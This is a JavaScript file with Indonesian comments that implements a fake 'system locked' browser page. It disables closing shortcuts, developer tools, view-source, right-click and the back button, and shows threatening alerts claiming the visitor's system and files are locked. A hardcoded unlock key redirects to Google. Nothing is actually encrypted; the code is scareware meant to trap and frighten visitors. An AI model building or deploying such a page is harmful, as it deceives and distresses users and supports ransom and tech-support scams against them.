// Cegah kombinasi tombol tertentu
document.addEventListener("keydown", function(event) {
    if (
        (event.ctrlKey && (event.key === "w" || event.key === "W")) || // Cegah Ctrl + W
        (event.altKey && event.key === "F4") || // Cegah Alt + F4
        (event.key === "F12") || // Cegah F12 (DevTools)
        (event.ctrlKey && event.shiftKey && event.key === "I") || // Cegah Ctrl + Shift + I
        (event.ctrlKey && event.key === "u") // Cegah Ctrl + U (Lihat Source Code)
    ) {
        event.preventDefault();
        alert("❌ You cannot exit! Your system is locked! 💀");
    }
});

// Cegah klik kanan
document.addEventListener("contextmenu", function(event) {
    event.preventDefault();
    alert("⛔ Right-click is disabled! You are trapped! 💀");
});

// Cegah keluar dengan tombol kembali
window.history.pushState(null, "", window.location.href);
window.addEventListener("popstate", function () {
    window.history.pushState(null, "", window.location.href);
    alert("🚫 No going back! Your files are locked! 🔥");
});

// Cegah keluar dari browser
window.addEventListener("beforeunload", function (event) {
    event.preventDefault();
    event.returnValue = "⚠️ Apakah Anda yakin ingin meninggalkan halaman ini? Perubahan yang belum disimpan akan hilang. ⚠️";
});

// Fungsi untuk memeriksa kunci
function checkKey() {
    let key = document.getElementById("keyInput").value;
    let correctKey = "12092010"; // Ganti dengan kunci yang Anda inginkan

    if (key === correctKey) {
        alert("✅ System Unlocked!");
        window.location.href = "https://google.com"; // Bisa diarahkan ke mana saja
    } else {
        alert("❌ WRONG KEY! Your system is still locked!");
    }
}
